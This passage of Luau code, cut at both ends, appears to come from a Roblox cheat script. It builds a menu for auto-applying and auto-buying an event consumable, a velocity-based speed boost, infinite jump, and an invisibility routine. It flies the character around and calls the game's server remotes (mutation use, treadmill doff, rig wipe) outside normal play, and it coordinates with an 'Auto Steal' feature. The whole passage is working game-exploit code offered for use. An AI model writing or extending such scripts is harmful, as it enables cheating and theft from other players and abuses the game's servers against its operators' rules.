elseif type(v12) == "string" then
picked[v12] = true
end
end
end
tbl27.Picked = picked
end,
}))
v7:CreateSlider({
Name = "Keep Samples",
Note = "Never spend below this many Samples",
Min = 0,
Max = 10000,
Default = 0,
Increment = 25,
Unit = "",
SubOf = tbl27.Handle,
Callback = function(arg)
tbl27.Keep = math.max(0, tonumber(arg) or 0)
end,
})
do
local tbl33 = { "Highest Value", "Best Rarity", "Biggest Size" }
local tbl34 = { idle = "#8C93A6", work = "#FFC857", good = "#57E08A", stop = "#FF6B6B" }
local n20 = 6
local tbl35 = {
Handle = nil,
BuyHandle = nil,
Loop = 0,
MinRarity = 0,
MinIncome = 0,
Priority = tbl33[1],
SkipMutated = true,
Targets = {},
Cooldown = 0,
Status = "Idle",
State = "idle",
Detail = "Turn it on to start applying Scrambled",
RarityColor = "#FFFFFF",
Icon = "",
Ui = {},
Row = nil,
Left = 0,
Pen = 0,
Match = 0,
Tries = 0,
Hits = 0,
Locked = nil,
Short = false,
EggOptions = {},
EggCategory = {},
}
local directory = tbl.Assets and tbl.Assets.Directory
local tbl36 = {}
if type(directory) == "table" then
for k, v12 in pairs(directory) do
local rarity = type(v12) == "table" and v12.Rarity or nil
local flag4 = type(rarity) == "table"
if flag4 then
flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
end
flag4 = flag4 or nil
if flag4 then
table.insert(tbl36, {
Category = tostring(k),
Name = tostring(v12.DisplayName or k),
Rarity = flag4,
RarityName = tostring(rarity.DisplayName or rarity._id or flag4),
})
end
end
end
table.sort(tbl36, function(arg, arg2)
if arg.Rarity ~= arg2.Rarity then
return arg.Rarity > arg2.Rarity
end
return arg.Name < arg2.Name
end)
for _, v12 in ipairs(tbl36) do
local str4 = string.format("%s [%s]", v12.Name, v12.RarityName)
if tbl35.EggCategory[str4] then
str4 = string.format("%s [%s] (%s)", v12.Name, v12.RarityName, v12.Category)
end
table.insert(tbl35.EggOptions, str4)
tbl35.EggCategory[str4] = v12.Category
end
local function fn39(arg)
local directory2 = tbl.Assets and tbl.Assets.Directory
return type(directory2) == "table" and directory2[tostring(arg)] or nil
end
local function fn40(arg)
local v12 = fn39(arg.AssetCategory)
local rarity = type(v12) == "table" and v12.Rarity or nil
local flag4 = type(rarity) == "table"
if flag4 then
flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
end
return flag4 or 0
end
local function fn41(arg)
local v12 = fn39(arg.AssetCategory)
local n21 = type(v12) == "table" and tonumber(v12.EarningRate) or 0
local n22 = tonumber(arg.AssetScale) or 0
if n21 <= 0 or n22 <= 0 then
return 0
end
return n21 * (n22 > 5 and (n22 / 5) ^ 1.2 * 19.637875755794113 or n22 ^ 1.85)
end
local function fn42(arg)
if tostring(arg.BaseMutation or "") == "Scrambled" then
return true
end
if type(arg.Mutations) == "table" then
for k, mutation in pairs(arg.Mutations) do
if type(mutation) == "string" and mutation == "Scrambled" then
return true
end
if type(k) == "string" and k == "Scrambled" and mutation ~= false then
return true
end
end
end
return false
end
local function fn43()
local eggState = tbl.EggState
if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
return {}
end
local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
if not ok or type(result) ~= "table" then
return {}
end
local tbl37 = {}
for k, v12 in pairs(result) do
if type(v12) == "table" and v12.Placement ~= nil then
v12.Uid = v12.Uid or k
tbl37[#tbl37 + 1] = v12
end
end
return tbl37
end
local function fn44(arg)
arg = arg and arg.Uid
if arg then
local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
local v12 = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)
if v12 then
local ok, result = pcall(function()
return v12:GetPivot().Position
end)
if ok and typeof(result) == "Vector3" then
return result
end
end
end
if type(tbl4.PenAnchor) == "function" then
local ok, result = pcall(tbl4.PenAnchor)
if ok and typeof(result) == "Vector3" then
return result
end
end
return nil
end
local function fn45(arg, arg2)
local v12 = fn44(arg)
if v12 == nil then
return true
end
if tbl4.DistanceTo(v12) <= n20 then
return true
end
local function fn46()
if arg2 ~= tbl35.Loop or not tbl4.Toggle(tbl35.Handle, false) then
return true
end
if tbl4.Movement.PlaceWanted == true then
return true
end
return tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true
end
if tbl4.Treadmill.Riding or tbl4.OnBelt() then
tbl4.ExitBelt()
end
tbl4.HoldBelt()
local ok, result = pcall(tbl4.FlyTo, v12 + Vector3.new(0, 3, 0), fn46, "mutation")
tbl4.ReleaseBelt()
tbl4.LeaveBelt()
result = ok and result
if result then
local n21 = n20 + 4
result = tbl4.DistanceTo(v12) <= n21
end
return result
end
local v12 = fn29
local function fn46(arg)
if not arg then
return 0
end
local num = tonumber(arg:GetAttribute("Uses"))
if num ~= nil then
return num
end
local v13 = string.match(arg.Name, "%[X(%d+)%]")
return tonumber(v13) or 1
end
local function fn47()
local v13 = v12()
if not v13 then
return nil, 0
end
local v14 = fn46(v13)
if v14 <= 0 then
return nil, 0
end
return v13, v14
end
tbl35.Grip = function(arg)
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if not character or not humanoid or not arg or arg.Parent == nil then
return false
end
if arg.Parent ~= character then
pcall(function()
humanoid:EquipTool(arg)
end)
if arg.Parent ~= character then
pcall(function()
arg.Parent = character
end)
end
task.wait(0.2)
end
return arg.Parent == character
end
local function fn48()
if not tbl4.Toggle(tbl35.BuyHandle, false) or flag3 then
return false
end
flag3 = true
local flag4 = false
local ok, result = pcall(function()
flag4 = tbl35.Purchase()
end)
flag3 = false
if not ok then
tbl35.Status = "Buy failed: " .. tostring(result)
end
return flag4
end
tbl35.Purchase = function()
local n21 = 0
local short = false
for i = 1, 10 do
local flag4 = n21 == 0 and scrambleRead(true) or snapshot
local v13 = fn9()
if not (type(flag4) ~= "table" or type(v13) ~= "table") then
local v14, v15, v16 = ipairs(type(flag4.Shop) == "table" and flag4.Shop or {})
local v17 = nil
for _, v18 in v14, v15, v16 do
if type(v18) == "table" and v18.Id == "MutationConsumable" then
v17 = v18
end
end
if v17 then
local num = tonumber(v17.PurchaseLimit)
if not (num and fn30(v13, v17) >= num) then
local huge = tonumber(v17.Price) or math.huge
if (tonumber(v13.Samples) or 0) - huge < tbl27.Keep then
short = true
if n21 == 0 then
tbl35.Status = "Need " .. tostring(math.floor(huge)) .. " Samples"
end
break
else
local Shop = scrambleRequest("Shop", v17.Id, { Quote = v17.Quote, Sequence = tonumber(v13.ShopSequence) or 0 })
if not (type(Shop) ~= "table" or Shop.Ok ~= true) then
n21 += 1
task.wait(0.4)
continue
end
end
end
end
end
break
end
if n21 > 0 then
tbl35.Status = string.format("Bought %d Scrambled", n21)
tbl35.Short = short
return true
end
tbl35.Short = short
return false
end
local function fn49()
local pen = 0
local match = 0
local n21 = -1
local v13 = nil
for _, v14 in ipairs(fn43()) do
pen += 1
local skipMutated = tbl35.SkipMutated and fn42(v14)
local flag4 = false
if skipMutated then
flag4 = true
end
local flag5 = not flag4
local flag6
if flag5 then
local minRarity = tbl35.MinRarity
flag6 = fn40(v14) < minRarity
else
flag6 = flag5
end
if flag6 then
flag4 = true
end
local flag7 = not flag4 and tbl35.MinIncome > 0
if flag7 then
local minIncome = tbl35.MinIncome
flag7 = fn41(v14) < minIncome
end
if flag7 then
flag4 = true
end
if not flag4 and next(tbl35.Targets) ~= nil and tbl35.Targets[tostring(v14.AssetCategory)] ~= true then
flag4 = true
end
if not flag4 then
match += 1
local n22
if tbl35.Priority == tbl33[2] then
n22 = fn40(v14) * 1000 + (tonumber(v14.AssetScale) or 0)
elseif tbl35.Priority == tbl33[3] then
n22 = tonumber(v14.AssetScale) or 0
else
n22 = fn41(v14)
end
local flag8 = n22 > n21
if not flag8 and v13 ~= nil and n22 == n21 and v14.Uid == tbl35.Locked then
n21 = n22
v13 = v14
elseif flag8 then
n21 = n22
v13 = v14
end
end
end
local v14 = tbl35
tbl35.Pen = pen
v14.Match = match
return v13
end
local function fn50(arg)
if typeof(arg) ~= "Color3" then
return "#FFFFFF"
end
local floor = math.floor
local n21 = arg.B * 255 + 0.5
return string.format("#%02X%02X%02X", math.floor(arg.R * 255 + 0.5), math.floor(arg.G * 255 + 0.5), floor(n21))
end
local function fn51(arg)
local ok, result = pcall(Color3.fromHex, arg)
if not ok or typeof(result) ~= "Color3" then
return arg
end
local v13, v14, v15 = result:ToHSV()
return fn50(Color3.fromHSV(v13, math.min(v14, 0.78), math.max(v15, 0.82)))
end
local function fn52(arg)
local v13 = fn39(arg and arg.AssetCategory)
local icon = type(v13) == "table" and v13.Icon or nil
if icon == nil then
return ""
end
if tonumber(icon) then
return "rbxassetid://" .. tostring(icon)
end
return tostring(icon)
end
local function fn53(arg)
local v13 = fn39(arg and arg.AssetCategory)
local rarity = type(v13) == "table" and v13.Rarity or nil
local flag4 = type(rarity) == "table"
if flag4 then
flag4 = tostring(rarity.DisplayName or rarity._id or "")
end
flag4 = flag4 or ""
local v14 = table.pack(fn51(fn50(type(rarity) == "table" and rarity.Color or nil)))
return flag4, table.unpack(v14, 1, v14.n)
end
local function fn54(arg)
if type(arg) ~= "table" then
return "No egg selected"
end
local v13 = fn39(arg.AssetCategory)
local flag4 = type(v13) == "table"
if flag4 then
flag4 = tostring(v13.DisplayName or arg.AssetCategory)
end
return flag4 or tostring(arg.AssetCategory)
end
local function fn55()
local idle = tbl34[tbl35.State] or tbl34.idle
if tbl35.Ui.Accent and type(tbl35.Ui.Accent.Set) == "function" then
tbl35.Ui.Accent.Set({ Background = idle })
end
if tbl35.Ui.Title and type(tbl35.Ui.Title.Set) == "function" then
tbl35.Ui.Title.Set({ Text = tbl35.Status, Color = idle })
end
if tbl35.Ui.Egg and type(tbl35.Ui.Egg.Set) == "function" then
tbl35.Ui.Egg.Set({ Text = tbl35.Detail, Color = tbl35.RarityColor })
end
if tbl35.Ui.Meta and type(tbl35.Ui.Meta.Set) == "function" then
tbl35.Ui.Meta.Set({
Text = string.format("Charges %d  Eggs %d/%d  Tries %d  Applied %d", tbl35.Left, tbl35.Match, tbl35.Pen, tbl35.Tries, tbl35.Hits),
})
end
if tbl35.Ui.Icon and type(tbl35.Ui.Icon.Set) == "function" then
tbl35.Ui.Icon.Set({ Visible = tbl35.Icon ~= "", Image = tbl35.Icon, StrokeColor = tbl35.RarityColor })
end
if tbl35.Row and type(tbl35.Row.Set) == "function" then
pcall(tbl35.Row.Set, tbl35.Row, tbl35.Status .. "  -  " .. tbl35.Detail)
end
end
local function fn56(arg)
if type(arg) ~= "table" then
tbl35.Detail = "No egg matches the filters"
tbl35.RarityColor = "#C7CBD6"
tbl35.Icon = ""
return
end
local v13, v14 = fn53(arg)
local n21 = tonumber(arg.AssetScale) or 0
tbl35.Detail = string.format("%s   %.2f kg", fn54(arg), n21)
if v13 ~= "" then
tbl35.Detail = tbl35.Detail .. "   " .. string.upper(v13)
end
tbl35.RarityColor = v14
tbl35.Icon = fn52(arg)
end
tbl35.Apply = function(arg, arg2)
if not tbl35.Grip(arg2) then
tbl35.State = "work"
tbl35.Status = "Could not hold Scrambled"
tbl35.Cooldown = os.clock() + 2
return false
end
local packages = ReplicatedStorage:FindFirstChild("Packages")
packages = packages and packages:FindFirstChild("Networking")
local rfBossMasteryAskUseMutationConsu = packages and packages:FindFirstChild("RF/BossMastery/AskUseMutationConsumable")
if not rfBossMasteryAskUseMutationConsu or not rfBossMasteryAskUseMutationConsu:IsA("RemoteFunction") then
tbl35.State = "stop"
tbl35.Status = "Mutation remote is missing"
tbl35.Cooldown = os.clock() + 10
return false
end
tbl35.State = "work"
tbl35.Status = "Applying Scrambled"
tbl35.Tries = tbl35.Tries + 1
local ok, result = pcall(function()
return rfBossMasteryAskUseMutationConsu:InvokeServer(arg.Uid)
end)
if not ok or type(result) ~= "table" then
tbl35.Cooldown = os.clock() + 10
return false
end
if result.Success == true then
tbl35.Status = "Scrambled applied"
tbl35.Locked = nil
tbl35.State = "good"
tbl35.Hits = tbl35.Hits + 1
return true
end
local str4 = tostring(result.Message or "")
local v13 = string.lower(str4)
tbl35.Status = str4 ~= "" and str4 or "Try failed"
tbl35.State = "work"
if string.find(v13, "not found") or string.find(v13, "invalid") then
tbl35.Locked = nil
tbl35.Cooldown = os.clock() + 3
return false
end
return true
end
tbl35.Settle = function()
local n21 = os.clock() + 3
while os.clock() < n21 do
if tbl4.Grounded() then
return
end
RunService.Heartbeat:Wait()
end
end
tbl35.Over = function(arg)
if arg ~= tbl35.Loop or not tbl4.Toggle(tbl35.Handle, false) then
return true
end
if tbl4.Movement.PlaceWanted == true then
return true
end
if type(tbl4.MechFirst) == "function" and tbl4.MechFirst() then
return true
end
return tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true
end
tbl35.Idle = function(status, detail, arg)
tbl35.State = "idle"
tbl35.Status = status
tbl35.Left = 0
tbl35.Detail = detail
tbl35.RarityColor = "#C7CBD6"
tbl35.Icon = ""
tbl35.Cooldown = os.clock() + (arg or 5)
end
tbl35.PauseInvis = function()
tbl35.InvisResumeAt = nil
if not tbl4.InvisMutate then
tbl4.InvisMutate = true
local invisibilityHandle = tbl4.InvisibilityHandle
if invisibilityHandle ~= nil and tbl4.Toggle(invisibilityHandle, false) then
tbl4.Notify("Invisibility", "Invisibility is paused while Scrambled is applied and comes back after it.")
end
end
local character = localPlayer.Character
return not (character and character:GetAttribute("InvisApplied") == true)
end
tbl35.ResumeInvis = function(arg)
if not tbl4.InvisMutate then
return
end
if not arg then
tbl35.InvisResumeAt = tbl35.InvisResumeAt or os.clock() + 5
local invisResumeAt = tbl35.InvisResumeAt
if os.clock() < invisResumeAt then
return
end
end
tbl35.InvisResumeAt = nil
tbl4.InvisMutate = false
local invisibilityHandle = tbl4.InvisibilityHandle
if invisibilityHandle ~= nil and tbl4.Toggle(invisibilityHandle, false) then
tbl4.Notify("Invisibility", "Scrambled is done, Invisibility is back on.")
end
end
local function fn57(arg)
tbl35.ResumeInvis(false)
if type(tbl4.MechFirst) == "function" and tbl4.MechFirst() then
tbl35.State = "work"
tbl35.Status = "Mech boss goes first"
tbl35.Cooldown = os.clock() + 2
return
end
if tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true then
tbl35.State = "work"
tbl35.Status = tbl4.Movement.ScrambleWanted == true and "Drone hunt goes first" or "Auto Steal goes first"
tbl35.Cooldown = os.clock() + 2
return
end
local cooldown = tbl35.Cooldown
if os.clock() < cooldown then
return
end
local v13, v14 = fn47()
if not v13 then
pcall(fn49)
if fn48() then
tbl35.Cooldown = os.clock() + 0.5
return
end
if tbl35.Short then
tbl35.Idle("Out of Samples, waiting for more", "Hunt drones to earn Samples", 10)
return
end
if not string.find(tbl35.Status, "Samples", 1, true) then
tbl35.Status = "Need a Scrambled consumable"
end
tbl35.Idle(tbl35.Status, "Buy Scrambled from the event shop", 5)
return
end
tbl35.Left = v14
local v15 = fn49()
if not v15 or not v15.Uid then
tbl35.State = "stop"
tbl35.Status = "Waiting"
fn56(nil)
return
end
if tbl4.Movement.PlaceWanted == true then
tbl35.State = "work"
tbl35.Status = "Auto Place goes first"
tbl35.Cooldown = os.clock() + 2
return
end
if not tbl35.PauseInvis() then
tbl35.State = "work"
tbl35.Status = "Leaving Invisibility to hold Scrambled"
tbl35.Cooldown = os.clock() + 0.5
return
end
if not tbl4.ClaimMovement("mutation") then
tbl35.State = "work"
tbl35.Status = "Waiting for " .. tostring(tbl4.Movement.Owner or "movement")
tbl35.Cooldown = os.clock() + 2
return
end
tbl4.Movement.MutationWanted = true
local ok, result = pcall(function()
while not tbl35.Over(arg) do
local v16, v17 = fn47()
if v16 then
tbl35.Left = v17
local v18 = fn49()
if not v18 or not v18.Uid then
tbl35.State = "stop"
tbl35.Status = "Waiting"
fn56(nil)
break
else
if v18.Uid ~= tbl35.Locked then
tbl35.Locked = v18.Uid
tbl35.Status = "New target picked"
end
fn56(v18)
if not fn45(v18, arg) then
tbl35.State = "work"
tbl35.Status = "Could not reach the egg"
tbl35.Cooldown = os.clock() + 3
break
elseif not tbl35.Over(arg) then
if tbl35.Apply(v18, v16) then
pcall(fn55)
task.wait(0.35)
continue
end
end
end
end
break
end
end)
if not ok then
tbl35.Status = "Stopped: " .. tostring(result)
tbl35.State = "work"
tbl35.Cooldown = os.clock() + 3
end
tbl35.Settle()
tbl4.Movement.MutationWanted = false
tbl4.ReleaseMovement("mutation")
tbl35.InvisResumeAt = os.clock() + 5
end
tbl35.Handle = v7:CreateToggle({
Name = "Auto Use Scrambled Mutation",
Default = false,
Callback = function(arg)
tbl35.Loop = tbl35.Loop + 1
tbl4.Movement.MutationWanted = false
tbl4.ReleaseMovement("mutation")
if arg ~= true then
tbl35.ResumeInvis(true)
return
end
local loop = tbl35.Loop
task.spawn(function()
while loop == tbl35.Loop and tbl4.Toggle(tbl35.Handle, false) do
pcall(fn57, loop)
pcall(fn55)
task.wait(tbl35.State == "idle" and 3 or 1)
end
end)
end,
})
if type(v7.CreateCanvas) == "function" then
local v13 = v7:CreateCanvas({
Name = "Scrambled Status",
ShowTitle = false,
Layout = "free",
SubOf = tbl35.Handle,
Style = {
TextScale = 1,
LineHeight = 1.1,
MinLines = 4,
MaxLines = 4,
AutoHeight = true,
BackgroundTransparency = 0.35,
TextColor = Color3.fromRGB(255, 255, 255),
TextStrokeTransparency = 0.7,
},
Build = function(arg)
tbl35.Ui.Card = arg:Frame({
X = 0,
Y = 0,
Width = 1,
Height = 3.6,
Corner = 0.3,
Background = "#151821",
BackgroundTransparency = 0.25,
})
tbl35.Ui.Accent = arg:Frame({
Parent = tbl35.Ui.Card,
X = 0.08,
Y = 0.18,
Width = 0.16,
Height = 3.24,
Corner = 0.2,
Background = tbl34.idle,
})
tbl35.Ui.Icon = arg:Image({
Parent = tbl35.Ui.Card,
X = 0.42,
Y = 0.3,
Width = 3,
Height = 3,
Corner = 0.3,
Background = "#242938",
BackgroundTransparency = 0.1,
StrokeThickness = 0.06,
StrokeTransparency = 0,
Visible = false,
})
tbl35.Ui.Title = arg:Text({
Parent = tbl35.Ui.Card,
X = 3.7,
Y = 0.32,
Width = 1,
Height = 1.05,
Scale = 1.16,
Wrap = false,
Text = tbl35.Status,
Color = tbl34.idle,
TextStrokeTransparency = 1,
})
tbl35.Ui.Egg = arg:Text({
Parent = tbl35.Ui.Card,
X = 3.7,
Y = 1.42,
Width = 1,
Height = 1,
Scale = 1,
Wrap = false,
Text = tbl35.Detail,
Color = "#FFFFFF",
TextStrokeTransparency = 1,
})
tbl35.Ui.Meta = arg:Text({
Parent = tbl35.Ui.Card,
X = 3.7,
Y = 2.42,
Width = 1,
Height = 0.9,
Scale = 0.86,
Wrap = false,
Text = "Charges 0  Eggs 0/0  Tries 0  Applied 0",
Color = "#AEB4C6",
TextStrokeTransparency = 1,
})
fn55()
end,
})
fn4(function()
pcall(function()
v13:Destroy()
end)
end)
else
tbl35.Row = v7:CreateText({ Name = "Scrambled Status", Text = "Idle", SubOf = tbl35.Handle })
end
v7:CreateDropdown({
Name = "Mutation Min Rarity",
Note = "Only eggs of this rarity and above are used",
Options = tbl13,
Default = tbl13[1],
SubOf = tbl35.Handle,
Callback = function(arg)
tbl35.MinRarity = tbl14[arg] or 0
end,
})
local tbl37 = {
["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
}
local tbl38 = { Slider = nil, Value = 0, Unit = "M/s" }
local function fn58(arg, arg2)
if arg ~= nil then
tbl38.Value = math.max(0, math.floor(tonumber(arg) or tbl38.Value))
end
if arg2 ~= nil then
tbl38.Unit = tostring(arg2)
end
tbl35.MinIncome = tbl38.Value * (tbl37[tbl38.Unit] or tbl37["M/s"]).Mult
end
tbl38.Slider = fn5(v7, {
Name = "Min Mutation Value",
Note = "Skip eggs worth less than this (0 = off)",
SubOf = tbl35.Handle,
Legacy = "Mutation Min Value",
SectionName = "Dr Scramble Event",
OnRaw = function(arg)
fn58(math.floor(arg / 1000), "K/s")
end,
})
v7:CreateDropdown({
Name = "Mutation Priority",
Note = "Which egg gets the consumable first",
Options = tbl33,
Default = tbl33[1],
SubOf = tbl35.Handle,
Callback = function(arg)
tbl35.Priority = tostring(arg)
end,
})
fn6(v7:CreateMultiDropdown({
Name = "Mutation Target Eggs",
Note = "Only use the consumable on these eggs (empty = all)",
Options = tbl35.EggOptions,
Default = {},
SubOf = tbl35.Handle,
Callback = function(arg)
local targets = {}
if type(arg) == "table" then
for k, v13 in pairs(arg) do
k = v13 == true and type(k) == "string" and k or type(v13) == "string" and v13
local v14 = k or nil
if v14 and tbl35.EggCategory[v14] then
targets[tbl35.EggCategory[v14]] = true
end
end
end
tbl35.Targets = targets
end,
}))
tbl35.BuyHandle = v7:CreateToggle({
Name = "Auto Buy Scrambled",
Note = "Buy another Scrambled from the event shop when you run out",
Default = false,
SubOf = tbl35.Handle,
Callback = function()
tbl35.Cooldown = 0
end,
})
fn4(function()
tbl35.Loop = tbl35.Loop + 1
tbl4.Movement.MutationWanted = false
tbl4.ReleaseMovement("mutation")
end)
end
do
local n20 = nil
local flag4 = false
local flag5 = false
tbl3.Add(function()
if not flag5 and os.clock() - n8 >= n5 then
flag5 = true
task.spawn(function()
pcall(scrambleRead, true)
flag5 = false
end)
end
local flag6
if v9 then
flag6 = type(v9.Set) == "function"
end
if flag6 then
pcall(v9.Set, nil, fn14())
end
local flag7 = nil
if v11 then
flag7 = type(v11.Set) == "function"
end
if flag7 then
pcall(v11.Set, nil, fn34())
end
local v12 = fn11()
local v13 = tbl4.IsNight()
if v12 and not flag4 then
tbl30.Latch = v13
tbl30.Ended = false
end
if not v13 then
tbl30.Latch = false
elseif v12 and not tbl30.Latch and not tbl30.Ended then
tbl30.Ended = true
str2 = "Night arrived, this outbreak is over"
table.clear(tbl25)
table.clear(tbl26)
end
if not v12 then
tbl30.Ended = false
end
if flag4 and not v12 then
task.delay(15, function()
if not fn11() then
table.clear(tbl25)
table.clear(tbl32)
end
end)
end
flag4 = v12
if tbl4.Toggle(tbl27.Handle, false) and not flag3 and os.clock() >= n12 and fn10() then
flag3 = true
n12 = os.clock() + 8
task.spawn(function()
pcall(fn31, function()
return not tbl4.Toggle(tbl27.Handle, false)
end)
flag3 = false
end)
end
local v14 = fn35()
local v15 = fn36()
tbl4.Movement.ScrambleWanted = v14 or v15
local invisibilityHandle = tbl4.InvisibilityHandle
local flag8 = invisibilityHandle ~= nil and tbl4.Toggle(invisibilityHandle, false)
if v14 then
n20 = nil
if not tbl4.InvisSuspended then
tbl4.InvisSuspended = true
flag8 = flag8 and type(v.Notify) == "function"
if flag8 then
pcall(v.Notify, "Invisibility", "Invisibility is paused for the drone hunt and comes back after it.", 5)
end
end
elseif tbl4.InvisSuspended and not flag then
n20 = n20 or os.clock() + 5
if n20 <= os.clock() then
n20 = nil
tbl4.InvisSuspended = false
if flag8 and type(v.Notify) == "function" then
pcall(v.Notify, "Invisibility", "The drone hunt is over, Invisibility is back on.", 5)
end
end
end
local character = localPlayer.Character
if v14 and not flag and character and character:GetAttribute("InvisApplied") == true then
str2 = "Leaving Invisibility for the hunt"
return true
end
if flag then
return v14
end
if not (v14 or v15) or os.clock() < n10 then
if not v14 and not v15 then
str2 = ""
end
return false
end
local steal = tbl4.Steal
if steal.Active or steal.Carrying or steal.Wanted then
str2 = "Auto Steal goes first"
return v14
end
if not tbl4.ClaimMovement("scramble") then
str2 = "Waiting for " .. tostring(tbl4.Movement.Owner or "movement") .. " to finish"
return v14
end
flag = true
n10 = os.clock() + n6
local v16 = n9
task.spawn(function()
pcall(fn38, function()
return v16 ~= n9
end)
tbl4.HoldBelt()
pcall(fn37, v16)
fn33()
tbl4.ReleaseBelt()
tbl4.ReleaseMovement("scramble")
flag = false
tbl3.Wake()
end)
return v14
end)
end
fn4(function()
n9 += 1
fn33()
tbl4.InvisSuspended = false
tbl4.Movement.ScrambleWanted = false
tbl4.ReleaseMovement("scramble")
end)
local v12, v13
do
local v14 = v2:CreateTab({ Name = "Combat", SectionsExpanded = true })
tbl4.EspSection = v14:CreateSection({ Name = "ESP", Expanded = false })
local v15 = v14:CreateSection({ Name = "Movement", Expanded = true })
v12 = v14:CreateSection({ Name = "Character", Expanded = true })
v13 = v14:CreateSection({ Name = "Combat", Expanded = true })
local createToggle = nil
local n20 = 350
local connection2 = nil
local flag4 = false
local function fn39()
local character = localPlayer.Character
local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
character = character and character:FindFirstChildOfClass("Humanoid")
if humanoidRootPart and character and character.Health > 0 then
return humanoidRootPart, character
end
return nil, nil
end
local function fn40()
if not flag4 then
return
end
flag4 = false
local v16, v17 = fn39()
if not v16 then
return
end
local assemblyLinearVelocity = v16.AssemblyLinearVelocity
local moveDirection = v17.MoveDirection
local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)
local vector2 = vector.Magnitude > 0.001 and vector.Unit * v17.WalkSpeed or Vector3.zero
pcall(function()
v16.AssemblyLinearVelocity = Vector3.new(vector2.X, assemblyLinearVelocity.Y, vector2.Z)
end)
end
local function fn41()
if connection2 then
connection2:Disconnect()
connection2 = nil
end
fn40()
tbl4.Shield("speed", false)
end
local function fn42()
if connection2 then
return
end
tbl4.Shield("speed", true)
connection2 = RunService.Heartbeat:Connect(function()
if tbl4.Steal.Active or tbl4.Flying or tbl4.Driving > 0 or tbl4.Treadmill.Riding then
flag4 = false
return
end
local v16, v17 = fn39()
if not v16 or v17.Sit or v17.PlatformStand then
flag4 = false
return
end
local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
if num and num > workspace:GetServerTimeNow() then
flag4 = false
return
end
local moveDirection = v17.MoveDirection
local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)
if vector.Magnitude <= 0.001 then
fn40()
return
end
local n21 = vector.Unit * n20
local assemblyLinearVelocity = v16.AssemblyLinearVelocity
pcall(function()
v16.AssemblyLinearVelocity = Vector3.new(n21.X, assemblyLinearVelocity.Y, n21.Z)
end)
flag4 = true
end)
end
tbl4.SpeedForced = false
local function fn43()
if tbl4.Toggle(createToggle, false) or tbl4.SpeedForced then
fn42()
else
fn41()
end
end
local flag5 = false
local flag6 = false
local flag7 = false
tbl4.SetSpeedForced = function(arg)
tbl4.SpeedForced = arg == true
flag5 = true
fn43()
end
local tbl33 = {
Name = "Speed Boost",
Default = false,
Callback = function()
if tbl4.SpeedForced and not tbl4.Toggle(createToggle, false) then
flag5 = true
flag7 = true
end
fn43()
end,
}
createToggle = v15.CreateToggle
createToggle = createToggle(v15, tbl33)
local connection3 = RunService.Heartbeat:Connect(function()
if flag7 then
flag7 = false
if type(v.Notify) == "function" then
pcall(v.Notify, "Speed Boost", "Speed Boost must stay on while Invisibility is on.", 5)
end
end
if not flag5 then
return
end
flag5 = false
local flag8
if tbl4.SpeedForced and not tbl4.Toggle(createToggle, false) then
flag6 = true
flag8 = true
else
local flag9 = not tbl4.SpeedForced and flag6
flag8 = nil
if flag9 then
flag6 = false
flag8 = nil
if tbl4.Toggle(createToggle, false) then
flag8 = false
end
end
end
if flag8 ~= nil then
for _, v16 in ipairs({ "Set", "SetValue" }) do
local ok, result = pcall(function()
return createToggle[v16]
end)
if not (ok and type(result) == "function" and pcall(result, createToggle, flag8)) then
continue
end
break
end
end
end)
fn4(function()
connection3:Disconnect()
end)
v15:CreateSlider({
Name = "Boost Speed",
Min = 20,
Max = 1000,
Default = 350,
Increment = 5,
Unit = "studs/s",
Callback = function(arg)
n20 = math.clamp(tonumber(arg) or 350, 20, 1000)
end,
})
fn4(fn41)
local v16 = nil
local connection4 = nil
local function fn44()
if connection4 then
connection4:Disconnect()
connection4 = nil
end
tbl4.Shield("jump", false)
end
v16 = v15:CreateToggle({
Name = "Infinite Jump",
Default = false,
Callback = function()
if not tbl4.Toggle(v16, false) then
fn44()
return
end
if connection4 then
return
end
tbl4.Shield("jump", true)
connection4 = UserInputService.JumpRequest:Connect(function()
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if humanoid then
pcall(function()
humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
end)
end
end)
end,
})
fn4(fn44)
end
do
local v14 = nil
local flag4 = false
local flag5 = true
local flag6 = false
local flag7 = false
local flag8 = false
local v15 = nil
local v16 = nil
local hipHeight = 999
local function fn39()
return flag4 and not tbl4.InvisSuspended and not tbl4.InvisMech and not tbl4.InvisMutate
end
local function fn40(arg)
return arg and arg:FindFirstChildOfClass("Humanoid") or nil
end
local function fn41(arg)
return networking:FindFirstChild(arg)
end
local function fn42(arg)
return arg ~= nil and arg:GetAttribute("InvisApplied") == true
end
local function fn43()
local AskDoff = fn41("RF/Treadmill/AskDoff")
if AskDoff and AskDoff:IsA("RemoteFunction") then
for i = 1, 2 do
pcall(AskDoff.InvokeServer, AskDoff)
end
end
end
local function fn44(arg)
local AskRigWipe = fn41("RE/RigSync/AskRigWipe")
if AskRigWipe and AskRigWipe:IsA("RemoteEvent") then
pcall(AskRigWipe.FireServer, AskRigWipe, arg)
end
end
local function fn45(arg)
local backpack = localPlayer:FindFirstChildOfClass("Backpack")
for _, child in ipairs(arg:GetChildren()) do
if child:IsA("Humanoid") then
pcall(child.UnequipTools, child)
end
end
if backpack then
for _, child in ipairs(arg:GetChildren()) do
if child:IsA("Tool") then
pcall(function()
child.Parent = backpack
end)
end
end
end
for i = 1, 3 do
RunService.Heartbeat:Wait()
end
end
local function fn46(arg)
local v17 = fn40(arg)
if not arg or not v17 then
return false
end
fn45(arg)
fn43()
pcall(function()
v17:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
